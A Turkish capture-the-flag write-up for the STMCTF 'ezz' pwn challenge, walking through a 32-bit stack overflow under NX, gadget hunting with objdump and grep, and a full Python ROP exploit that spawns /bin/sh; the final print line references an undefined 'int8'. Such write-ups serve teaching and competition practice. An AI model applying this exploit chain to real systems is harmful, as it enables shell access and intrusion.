## STMCTF ezz sorusu çözümü

Öncelikle bu yarışmada pwn kategorisi sorularının zor olduğunu kabul etmek lazım. En son baktığımda 4 adet sorudan sanırım çözüm yoktu, sonlara doğru olduysa da emin değilim. Sadece pwn kategori soruları için gelsem de zaman alacağını düşündüğümden azar azar bakıp, diğer konulara yoğunlaştım. Yarışma gününden sonra berrak bir zihinle birkaç saatte bu çözümü yaptım.
STM ekibini bu kaliteli sorulardan dolayı tebrik etmek lazım. Keşke sadece bu kategorinin olduğu bir çeşit CTF olsaydı. 

Öncelikle programa biraz göz atalım:

![screenshot](https://github.com/lntrx/STMCTF_PWN_Writeup/blob/master/Ezz/screenshots/1.png)

Görüldüğü üzere dosyamız 32 bit ve aynı zamanda NX(non-executable stack) koruması var.

![screenshot](https://github.com/lntrx/STMCTF_PWN_Writeup/blob/master/Ezz/screenshots/2.png)

Programda overflow var. Daha önce ki bir çözümde “Yarışma açısından konulmadığını tahmin etmek zor değil” demiştim ama final bölümünde varmış. Gerçi eleme de zaten NX olmadan oldu o yüzden finalde biraz daha zor olmalıydı. 

Bu aşamada yapmamız gereken ilk şey önce pattern bulmak. Alttan üstten veyahut farklı metodlarla denedikten sonra patternin 148 olduğunu herkes görmüştür. EIP elimizde ama stack adresine atlayamayız çünkü execute edemeyeceğiz. 

Programı objdump edelim:

![screenshot](https://github.com/lntrx/STMCTF_PWN_Writeup/blob/master/Ezz/screenshots/3.png)
...
![screenshot](https://github.com/lntrx/STMCTF_PWN_Writeup/blob/master/Ezz/screenshots/4.png)

Evet baktık. Başı var sonu yok. Güzel yanı ise kodlar .text section da bu da bize zengin bir ROP yeri sağlar. ROP uzun uzun anlatmadan kısaca birkaç şey söyleyelim. İstediğimiz kodu stack’e atıp çalıştıramıyorsak istediğimiz kodu programın veya librarylerin içinde parça parça bulup çalıştırırız. 

Yani örnek olarak *“xor eax,eax”* parçası bize lazım ise kendi içinde *“xor eax,eax; ret”* gibi bişey buluruz. Akışımız zarar görmeden kendi yerine geri döner. 

Bunun için çok tool var ama ben tool kullanmam pek. Bize lazım olan şey *“grep”* ve *“objdump”* 

Örnek: 

```shell
objdump -S ezz -M intel | grep "xor    eax,eax" -A 3 | grep ret -B 3

--
 809df07:    31 c0                    xor    eax,eax
 809df09:    c3                       ret
--
 80b9551:    31 c0                    xor    eax,eax
 80b9553:    5f                       pop    edi
 80b9554:    5d                       pop    ebp
 80b9555:    c3                       ret    
--
 80b9c93:    31 c0                    xor    eax,eax
 80b9c95:    5b                       pop    ebx
 80b9c96:    c3                       ret  
--
```

Şimdi önce hedefimizi yazalım:

Basit bir shellcode inşa edeceğiz. EAX 11 olacak ve EBX’te “/bin/sh” olacak EDX ve ECX 0x0 olacak sonra int 0x80 dedik mi tamamdır. Önce “int 0x80” bakalım:

![screenshot](https://github.com/lntrx/STMCTF_PWN_Writeup/blob/master/Ezz/screenshots/5.png)

Bize lazım olan shellcode:

![screenshot](https://github.com/lntrx/STMCTF_PWN_Writeup/blob/master/Ezz/screenshots/6.png)

```asm
section .text
	global _start

_start:

	xor	eax,eax
	push	eax
	push 	0x68732f2f
	push	0x6e69622f
	mov 	ebx,esp
	mov	al,0xb
	int	0x80
```
```shell
nasm -f elf32 shell.asm -o shell.o
ld -melf_i386 shell.o -o shell
```

Şimdi bunlar cepte dursun seg fault olduğunda ki duruma bir göz atalım:

![screenshot](https://github.com/lntrx/STMCTF_PWN_Writeup/blob/master/Ezz/screenshots/7.png)

Bu fotoğraftan çıkarılacak şey EAX içinde hiç dokunulmamış 128 bizim girdiğimiz karakter var. Programın içinde “/bin/sh” stringi bulamayız. Ama Linux’un güzel yanı ne kadar “/” slash olduğu önemli değil mesela “////////bin/////////sh” olsa bile çalışır:

![screenshot](https://github.com/lntrx/STMCTF_PWN_Writeup/blob/master/Ezz/screenshots/8.png)

Şöyle bişey yapabiliriz bu 128 bize ait olan yere uzunca / sonra bin/sh yazarız ve bir ROP ile bunu EBX’e aktarırız. Bize lazım olan şey ama sh’ten sonra NUL byte eklemek. İlk önce bunu EBX’e aktarma yolunu bulalım. EBX’e aktarım ROPlarını bulalım:

```shell
objdump -S ezz -M intel | grep "mov    ebx," -A 4 | grep ret -B 4

--
 8071b7f:    ff 15 f0 f9 0e 08        call   DWORD PTR ds:0x80ef9f0
 8071b85:    89 d3                    mov    ebx,edx
 8071b87:    3d 01 f0 ff ff           cmp    eax,0xfffff001
 8071b8c:    0f 83 7e 2a 00 00        jae    0x8074610
 8071b92:    c3                       ret    
--
```

Aramada düz EAX’tan EBX’e yok ama EDX’ten var. CMP ve JAE var ama EAX’ı 0x0 tutarsak buna takılmayız. Bu sefer de EDX’e var mı diye baklım:

```shell
objdump -S ezz -M intel | grep "mov    edx," -A 5 | grep ret -B 5

--
 80ac592:    89 fa                    mov    edx,edi
 80ac594:    5b                       pop    ebx
 80ac595:    5e                       pop    esi
 80ac596:    5f                       pop    edi
 80ac597:    5d                       pop    ebp
 80ac598:    c3                       ret    
--
```

Yine düz yok ama EDI’den var. 4 adet junk yerleştirmemiz lazım. Bu sefer EDI’ye bakalım:

```shell
objdump -S ezz -M intel | grep "mov    edi," -A 4 | grep ret -B 4

--
 805c86d:    89 c7                    mov    edi,eax
 805c86f:    89 d6                    mov    esi,edx
 805c871:    8b 44 24 04              mov    eax,DWORD PTR [esp+0x4]
 805c875:    c3                       ret    
--
```

Bingo! EAX’tan direk geçiş var. EAX’a mov var ama bizim uzunca slash ile beraber olan /bin/sh’ımız EDI’ye gittiği için sıkıntı yok. Bu noktada bize s harfinden sonra NUL byte yazacak bir gadget lazım çünkü stringi NUL byte’a kadar okur. Biraz göz gezdirdikten sonra şöyle bir şeye rastladım:

EAX, EDI, EDX sonra EBX bu 3 yerden birinde offset yazması olması lazım:

```shell
objdump -S ezz -M intel | grep "mov    DWORD PTR \[eax+" -A 4 | grep ret -B 4
objdump -S ezz -M intel | grep "mov    DWORD PTR \[edi+" -A 4 | grep ret -B 4
objdump -S ezz -M intel | grep "mov    DWORD PTR \[edx+" -A 4 | grep ret -B 4

 80bd7de:    89 42 14                 mov    DWORD PTR [edx+0x14],eax
 80bd7e1:    5f                       pop    edi
 80bd7e2:    c3                       ret 
```

Harika! “/bin/sh” EDX teyken EAX’ı xorlayıp oraya yazdırabiliriz. 0x14 yani decimal 20. O zaman bize 14 tane slash ve sonra bin/sh lazım. Sonrası NUL byte olur. Bu da cebizde dursun. Konu anlaşıldığına göre biraz hızlandıralım. EAX’ı 11 yapmamız lazım:

```shell
 8092be0:    b8 07 00 00 00           mov    eax,0x7
 8092be5:    c3			      ret
...
 8092b60:    83 c0 03                 add    eax,0x3
 8092b63:    c3                       ret  
...
 8092b50:    83 c0 01                 add    eax,0x1
 8092b53:    c3                       ret
```

Bunlar bize yeter. Şimdi ise Bizim ECX ve EDX’i sıfırlamamız lazım. ECX bu arada baştan sona kadar hiç dokunulmuyor. Bu bizim çok işimize gelir. 

```shell
 8049713:    31 c9                    xor    ecx,ecx
 8049715:    5b                       pop    ebx
 8049716:    89 c8                    mov    eax,ecx
 8049718:    5e                       pop    esi
 8049719:    5f                       pop    edi
 804971a:    5d                       pop    ebp
 804971b:    c3                       ret  
```

ECX’i burdan sıfırlayabiliriz ama dikkat etmemiz gereken bir husus var. EAX burda değişecek o yüzden elimizde ki /bin/sh yazısını EDX’e falan attıktan sonra buraya atlamalıyız.

Sırada EDX var beni en çok yoran register. Aradım taradım düz bişey bulamadım ama iki tane şey buldum arka arkaya gelirse işi çözecek:

```shell
80bc1c6:    ba 01 00 00 00           mov    edx,0x1
 80bc1cb:    0f 47 c2                 cmova  eax,edx
 80bc1ce:    c3                       ret 
...
 808fc9e:    c1 fa 02                 sar    edx,0x2
 808fca1:    29 d0                    sub    eax,edx
 808fca3:    c3                       ret 
```

Bu iki yer ile beraber EDX’i sıfırlayabiliriz. İlk önce EDX’e 1 atıyoruz sonra SAR ile sağa doğru shift edince sıfırlanıyor. 

Sonra final olarak int 80 yapınca durumu kurtarıyoruz. 

Herşeyi tolayalım:

```bash
edi = 0x805c86d            
# EDI’e EAX’ı atıyoruz. Herhangi bir registera bişey olmuyor 

edx = 0x80ac592 + "JUNK" * 4    
# EDI’yi EDX’e atıyoruz, ama 4 tane pop var “JUNK” lazım

edx += 0x809df07 + 0x80bd7de + "JUNK"
# Burda 0x14 offset yazıyoruz ama EAX’ı NUL yapmamız lazım o yüzden önce XOR

xor_ecx = 0x8049713 + "JUNK" * 4
# EAX ve EBX etkilendiği için burda yapmamız daha mantıklı olur. Aynı zamanda 4 tane “JUNK” lazım

ebx = 0x809df07 + 0x8071b85
# Burda EBX’e nihayet atıyoruz ama önce cmp var ne olur ne olmaz EAX’ı sıfır yapalım da Above Equal olmasın

xor_edx = 0x80bc1c6 + 0x808fc9e
# EDX’i burdan sıfırlayalım. 

eax =  0x809df07 + 0x8092be0 + 0x8092b60 + 0x8092b50
# Burda EAX’ı nihayet 11 yapıyoruz. 

int = 0x80730e0
# Sonunda int 0x80
```

Bize lazım olan şey başında 14 tane / sonra bin/sh ve devamında ise 128 pattern lazım. 

```python
#!/usr/bin/env python
shell = "/" * 14
shell += "bin/sh"

nop = "A"*128

edi = "\x6d\xc8\x05\x08"
edx = "\x92\xc5\x0a\x08" + "JUNK" * 4
edx += "\x07\xdf\x09\x08" + "\xde\xd7\x0b\x08" + "JUNK"
xor_ecx = "\x13\x97\x04\x08" + "JUNK" * 4
ebx = "\x07\xdf\x09\x08" + "\x85\x1b\x07\x08"
xor_edx = "\xc6\xc1\x0b\x08" + "\x9e\xfc\x08\x08"
eax = "\x07\xdf\x09\x08" + "\xe0\x2b\x09\x08" + "\x60\x2b\x09\x08" + "\x50\x2b\x09\x08"
int80 = "\xe0\x30\x07\x08"

print shell + nop + edi + edx + xor_ecx + ebx + xor_edx + eax + int8
```
![screenshot](https://github.com/lntrx/STMCTF_PWN_Writeup/blob/master/Ezz/screenshots/9.png)

./ezz yerine nc -vv x.x.x.x port yazarak bağlanması lazımdı. 


Diğer sorular da gelecektir.

Farkı cevapları, farklı teknikleri, farklı chain tekniklerini lütfen bana iletin. 
